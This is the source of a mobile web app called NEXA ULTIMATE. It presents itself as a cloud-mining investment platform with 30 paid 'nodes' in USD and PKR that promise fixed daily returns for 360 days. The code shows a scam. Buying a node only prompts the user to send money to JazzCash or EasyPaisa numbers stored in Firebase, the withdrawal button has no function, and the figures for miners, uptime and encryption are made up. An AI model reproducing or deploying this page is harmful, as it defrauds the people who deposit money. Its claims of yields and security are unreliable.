<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXA ULTIMATE | Cloud Infrastructure</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        :root { --p: #2563EB; --s: #0F172A; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #f8fafc; color: var(--s); overflow-x: hidden; }
        .glass { background: rgba(255,255,255,0.9); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.4); }
        .card-neo { border-radius: 30px; background: #fff; box-shadow: 0 20px 40px -15px rgba(0,0,0,0.05); transition: 0.3s; }
        .btn-grad { background: linear-gradient(135deg, #2563EB, #4F46E5); color: white; border-radius: 20px; font-weight: 800; text-transform: uppercase; }
        .nav-icon { font-size: 20px; color: #94a3b8; transition: 0.3s; }
        .nav-active { color: var(--p) !important; transform: scale(1.1); }
        .hidden { display: none !important; }
        .node-timer { font-family: monospace; font-weight: 900; color: #2563EB; }
    </style>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getDatabase, ref, set, get, update, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
            authDomain: "verbose-6c008.firebaseapp.com",
            databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
            projectId: "verbose-6c008",
            storageBucket: "verbose-6c008.firebasestorage.app",
            messagingSenderId: "867100945312",
            appId: "1:867100945312:web:315dfb48fb34496cee12c5"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);

        // --- Data Definitions ---
        const usdNodes = Array.from({length: 15}, (_, i) => ({
            id: `u${i+1}`, name: `Titan USD v${i+1}`, price: (i + 1) * 5, daily: ((i + 1) * 0.45).toFixed(2), total: ((i+1) * 0.45 * 360).toFixed(0)
        }));
        const pkrNodes = Array.from({length: 15}, (_, i) => ({
            id: `p${i+1}`, name: `Indus PKR v${i+1}`, price: (i + 1) * 250, daily: ((i + 1) * 19).toFixed(0), total: ((i+1) * 19 * 360).toFixed(0)
        }));

        window.authReq = async (mode) => {
            const user = document.getElementById('u-input').value;
            if(!user) return alert("Enter Username sweetie! 💋");
            try {
                await signInAnonymously(auth);
                const uid = auth.currentUser.uid;
                const uRef = ref(db, 'users/' + uid);
                const snap = await get(uRef);
                if(mode === 'new' && !snap.exists()) {
                    await set(uRef, { username: user, balance: 0, pkr: 0, uid: uid, activeNodes: [] });
                    localStorage.setItem('nexa_pro_uid', uid);
                    location.reload();
                } else if(mode === 'old' && snap.exists()) {
                    localStorage.setItem('nexa_pro_uid', uid);
                    location.reload();
                } else { alert("User Error! Use unique name."); }
            } catch (e) { alert(e.message); }
        };

        window.onload = () => {
            const uid = localStorage.getItem('nexa_pro_uid');
            if(uid) {
                document.getElementById('auth-section').style.display = 'none';
                document.getElementById('app-main').classList.remove('hidden');
                initSystem(uid);
                renderNodes();
            }
        };

        function initSystem(uid) {
            onValue(ref(db, 'users/' + uid), (s) => {
                const d = s.val();
                document.getElementById('disp-u').innerText = d.username;
                document.getElementById('disp-bal-usd').innerText = "$" + d.balance.toFixed(2);
                document.getElementById('disp-bal-pkr').innerText = "Rs. " + d.pkr;
            });
            onValue(ref(db, 'admin/settings'), (s) => { window.admin = s.val(); });
            startTimer();
        }

        function renderNodes() {
            const uCont = document.getElementById('usd-list');
            const pCont = document.getElementById('pkr-list');
            
            usdNodes.forEach(n => {
                uCont.innerHTML += `
                    <div class="card-neo p-6 mb-4 border-l-8 border-blue-600">
                        <div class="flex justify-between items-center mb-4">
                            <span class="text-[10px] font-black text-slate-400 uppercase tracking-widest">${n.name}</span>
                            <span class="text-xl font-black text-blue-600">$${n.price}</span>
                        </div>
                        <div class="grid grid-cols-2 gap-2 text-[10px] font-bold text-slate-500 mb-6">
                            <p>DAILY: <span class="text-slate-900">$${n.daily}</span></p>
                            <p>TOTAL: <span class="text-slate-900">$${n.total}</span></p>
                            <p>DAYS: <span class="text-slate-900">360 Days</span></p>
                            <p>STATUS: <span class="text-green-600">READY</span></p>
                        </div>
                        <button onclick="buyNode('${n.id}', ${n.price}, 'usd')" class="w-full btn-grad py-3 text-[10px]">Activate Node</button>
                    </div>`;
            });

            pkrNodes.forEach(n => {
                pCont.innerHTML += `
                    <div class="card-neo p-6 mb-4 border-l-8 border-slate-900">
                        <div class="flex justify-between items-center mb-4">
                            <span class="text-[10px] font-black text-slate-400 uppercase tracking-widest">${n.name}</span>
                            <span class="text-xl font-black text-slate-900">Rs. ${n.price}</span>
                        </div>
                        <div class="grid grid-cols-2 gap-2 text-[10px] font-bold text-slate-500 mb-6">
                            <p>DAILY: <span class="text-slate-900">Rs. ${n.daily}</span></p>
                            <p>TOTAL: <span class="text-slate-900">Rs. ${n.total}</span></p>
                            <p>DAYS: <span class="text-slate-900">360 Days</span></p>
                            <p>TIMER: <span class="node-timer">24:00:00</span></p>
                        </div>
                        <button onclick="buyNode('${n.id}', ${n.price}, 'pkr')" class="w-full bg-slate-900 text-white py-3 rounded-2xl font-black text-[10px] uppercase">Activate Node</button>
                    </div>`;
            });
        }

        function startTimer() {
            setInterval(() => {
                document.querySelectorAll('.node-timer').forEach(el => {
                    const time = el.innerText.split(':');
                    let h = parseInt(time[0]), m = parseInt(time[1]), s = parseInt(time[2]);
                    if(s > 0) s--; else { s=59; if(m > 0) m--; else { m=59; if(h > 0) h--; } }
                    el.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
                });
            }, 1000);
        }

        window.buyNode = (id, price, type) => {
            alert(`Sweetie, Deposit balance first to buy ${id}! 💋`);
            switchTab('wallet');
        };

        window.openPay = (m) => {
            const num = m === 'jazz' ? window.admin.jazz : window.admin.easy;
            prompt(`Send Payment to ${m.toUpperCase()}:\n${num}\n\nTransaction ID:`, "");
        };

        window.switchTab = (t) => {
            ['home','nodes','wallet','log'].forEach(id => document.getElementById('v-'+id).classList.add('hidden'));
            document.getElementById('v-'+t).classList.remove('hidden');
            document.querySelectorAll('.nav-icon').forEach(i => i.classList.remove('nav-active'));
            event.currentTarget.classList.add('nav-active');
        };
    </script>
</head>
<body class="pb-32">

    <!-- Auth -->
    <div id="auth-section" class="fixed inset-0 bg-white z-[10000] p-10 flex flex-col justify-center">
        <div class="text-center mb-12">
            <div class="w-24 h-24 bg-blue-600 rounded-[3rem] mx-auto flex items-center justify-center rotate-12 mb-6 shadow-2xl shadow-blue-200">
                <i class="fa-solid fa-microchip text-white text-4xl -rotate-12"></i>
            </div>
            <h1 class="text-4xl font-black italic tracking-tighter">NEXA MASTER</h1>
            <p class="text-[10px] font-black text-slate-300 uppercase tracking-[0.4em] mt-3">Enterprise Infrastructure</p>
        </div>
        <input id="u-input" type="text" placeholder="Access Username" class="w-full p-6 bg-slate-50 border rounded-3xl outline-none font-bold mb-4">
        <button onclick="authReq('new')" class="w-full btn-grad py-5 shadow-xl shadow-blue-100 mb-3 text-xs">Initialize Terminal</button>
        <button onclick="authReq('old')" class="w-full bg-slate-900 text-white py-5 rounded-3xl font-black text-xs uppercase">Resume Session</button>
    </div>

    <!-- Main -->
    <div id="app-main" class="hidden">
        <header class="p-6 flex justify-between items-center sticky top-0 bg-white/90 backdrop-blur-md z-50 border-b">
            <div class="flex items-center gap-3">
                <div class="w-10 h-10 bg-slate-900 rounded-2xl flex items-center justify-center text-white"><i class="fa-solid fa-atom animate-spin-slow"></i></div>
                <div>
                    <h2 id="disp-u" class="text-sm font-black italic">...</h2>
                    <p class="text-[8px] font-black text-blue-600 uppercase tracking-widest">Master Node Account</p>
                </div>
            </div>
            <div class="text-right">
                <h3 id="disp-bal-usd" class="text-lg font-black text-blue-600">$0.00</h3>
                <p id="disp-bal-pkr" class="text-[9px] font-bold text-slate-400">Rs. 0</p>
            </div>
        </header>

        <main class="p-5">
            <!-- Home -->
            <div id="v-home" class="space-y-6">
                <div class="card-neo p-8 bg-blue-600 text-white relative overflow-hidden">
                    <h1 class="text-4xl font-black italic leading-tight mb-4">Accelerate<br>Mining.</h1>
                    <p class="text-[10px] font-black opacity-60 uppercase tracking-widest mb-8">NEXA Protocol v4.0 Active</p>
                    <button onclick="switchTab('nodes')" class="bg-white text-blue-600 px-8 py-4 rounded-2xl font-black text-[10px] uppercase shadow-2xl">Browse 30 Nodes</button>
                    <i class="fa-solid fa-network-wired absolute -right-10 -bottom-10 text-white/10 text-[12rem]"></i>
                </div>

                <div class="grid grid-cols-2 gap-4">
                    <div class="card-neo p-5 text-center">
                        <i class="fa-solid fa-users text-blue-600 text-xl mb-2"></i>
                        <p class="text-2xl font-black">28.4K</p>
                        <p class="text-[8px] font-bold text-slate-400 uppercase">Active Miners</p>
                    </div>
                    <div class="card-neo p-5 text-center">
                        <i class="fa-solid fa-shield-check text-green-500 text-xl mb-2"></i>
                        <p class="text-2xl font-black">100%</p>
                        <p class="text-[8px] font-bold text-slate-400 uppercase">Uptime Secure</p>
                    </div>
                </div>

                <div class="card-neo p-6">
                    <h3 class="font-black text-xs uppercase mb-4 italic">Security Infrastructure</h3>
                    <p class="text-[11px] text-slate-500 leading-relaxed font-bold">Our 30-node network is protected by AES-256 bit encryption and real-time shard mining. Your daily yields are credited every 24 hours automatically to your wallet balance. Sweetie, start your journey today!</p>
                </div>
            </div>

            <!-- Nodes -->
            <div id="v-nodes" class="hidden">
                <div class="flex gap-2 mb-8 overflow-x-auto pb-4 no-scrollbar">
                    <button class="bg-blue-600 text-white px-6 py-3 rounded-xl text-[10px] font-black uppercase flex-shrink-0">USD Nodes (15)</button>
                    <button class="bg-slate-100 text-slate-400 px-6 py-3 rounded-xl text-[10px] font-black uppercase flex-shrink-0">PKR Nodes (15)</button>
                </div>
                
                <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-4">Dollar Nodes</h3>
                <div id="usd-list"></div>

                <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest mt-10 mb-4">PKR Nodes</h3>
                <div id="pkr-list"></div>
            </div>

            <!-- Wallet -->
            <div id="v-wallet" class="hidden space-y-6">
                <div class="card-neo p-8 bg-slate-900 text-white text-center">
                    <p class="text-[10px] font-black opacity-40 uppercase mb-2">Available for Payout</p>
                    <h2 class="text-4xl font-black">$0.00</h2>
                    <div class="flex gap-4 mt-8">
                        <button onclick="openPay('jazz')" class="flex-1 bg-blue-600 py-4 rounded-xl font-black text-[10px]">DEPOSIT</button>
                        <button class="flex-1 bg-white/10 py-4 rounded-xl font-black text-[10px]">WITHDRAW</button>
                    </div>
                </div>
                <div class="card-neo p-6">
                    <h4 class="font-black text-xs mb-4 uppercase italic">Withdrawal Form</h4>
                    <div class="space-y-4">
                        <input type="text" placeholder="Full Account Name" class="w-full p-4 bg-slate-50 border rounded-xl outline-none text-xs font-bold">
                        <input type="number" placeholder="Amount" class="w-full p-4 bg-slate-50 border rounded-xl outline-none text-xs font-bold">
                        <input type="text" placeholder="Number (JazzCash/EasyPaisa/Sada)" class="w-full p-4 bg-slate-50 border rounded-xl outline-none text-xs font-bold">
                        <button class="w-full btn-grad py-5 text-xs">Request Cashout</button>
                    </div>
                </div>
            </div>

        </main>

        <!-- Nav -->
        <nav class="fixed bottom-6 left-6 right-6 h-20 glass rounded-[2.5rem] flex justify-around items-center px-4 z-[1000] shadow-2xl">
            <button onclick="switchTab('home')" class="nav-icon nav-active"><i class="fa-solid fa-house"></i></button>
            <button onclick="switchTab('nodes')" class="nav-icon"><i class="fa-solid fa-server"></i></button>
            <button onclick="switchTab('wallet')" class="nav-icon"><i class="fa-solid fa-wallet"></i></button>
            <button onclick="switchTab('log')" class="nav-icon"><i class="fa-solid fa-receipt"></i></button>
        </nav>
    </div>

</body>
</html>
